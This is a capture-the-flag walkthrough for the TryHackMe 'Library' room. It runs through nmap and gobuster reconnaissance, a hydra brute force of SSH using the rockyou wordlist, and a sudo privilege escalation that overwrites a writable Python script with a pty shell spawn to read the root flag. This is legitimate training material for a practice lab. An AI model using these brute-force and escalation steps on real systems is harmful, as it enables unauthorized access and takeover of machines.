# T0fuHasuu
---

## **Library Walkthrough**
[**TryHackMe Room**](https://tryhackme.com/r/room/bsidesgtlibrary)  
[**Source**](https://vivekanandagn.medium.com/library-walkthrough-tryhackme-85875b66460c)

---

![Chill](https://64.media.tumblr.com/af4de0eb8060ecbc2ee08d476ac4b6cb/tumblr_ozwcxdvK3I1snbyiqo1_540.gif)  

---

## **Table of Contents**
1. [Connect VPN](#1-connect-vpn)
2. [Scan with Nmap](#2-scan-with-nmap)
3. [Find Sub-directory](#3-find-sub-directory)
4. [Exploiting the Website URL](#4-exploiting-the-website-url)
5. [Login as SSH](#5-login-as-ssh)
6. [Enter Root Privilege](#6-enter-root-privilege)

---

### **1. Connect VPN**
To connect to TryHackMe VPN:
```bash
sudo openvpn <TryHackmeVpn.file>
```

---

### **2. Scan with Nmap**
Use Nmap to scan the target:
```bash
nmap -sS -sV -A -O <IP>
```
- **Results:**
  - Port **22**: SSH
  - Port **80**: HTTP

---

### **3. Find Sub-directory**
Use `gobuster` to find directories:
```bash
gobuster dir -u http://<IP> -w <Path/Wordlist.txt>
```
- **Results:**
  - Check `robots.txt` by visiting:
    ```bash
    http://<IP>/robots.txt
    ```
  - You’ll find a clue about a **Rockyou** file.

---

### **4. Exploiting the Website URL**
Use `hydra` to brute-force SSH credentials:
```bash
hydra -l meliodas -P <Path/rockyou.txt> ssh://<IP>
```
- **Explanation:** Hydra is a brute-forcing tool. Here, we assume the username is `meliodas`.
- **Output:** You’ll get valid credentials (e.g., `meliodas:password`).

---

### **5. Login as SSH**
Login via SSH:
```bash
ssh meliodas@<IP>
```
- Enter the username and password from the previous step.
- List the files in the current directory:
    ```bash
    ls
    ```
- View the `user.txt` flag:
    ```bash
    cat user.txt
    ```
    **Example Flag:** `312472b87xt2426v5234v345fdqdqfd`

---

### **6. Enter Root Privilege**
Check current user’s privileges:
```bash
sudo -l
```
- If `bak.py` is writable:
  1. Backup and remove it:
     ```bash
     cp bak.py bak.py.org && rm bak.py
     ```
  2. Replace it with a shell-spawning script:
     ```bash
     echo 'import pty; pty.spawn("/bin/sh")' > bak.py
     ```
     **Find more of this injection at [Shell Spawn](https://github.com/T0fuHasuu/CheatSheet/blob/main/Tryhackme/Practice/Shell_Spawning/Shell_Spawning.md)**
     
  3. Execute the script:
     ```bash
     sudo python bak.py
     ```
  4. Confirm root access:
     ```bash
     id
     whoami
     ```
  5. Retrieve the `root.txt` flag:
     ```bash
     ls /root
     cat /root/root.txt
     ```
     **Example Flag:** `a54aerdfdf56fwacftdsvfa532`

---

![Byebye](https://i.pinimg.com/originals/8a/01/e6/8a01e6d0b00c45be638cdd016d78633f.gif)

---

# Catch You Next Time . . .

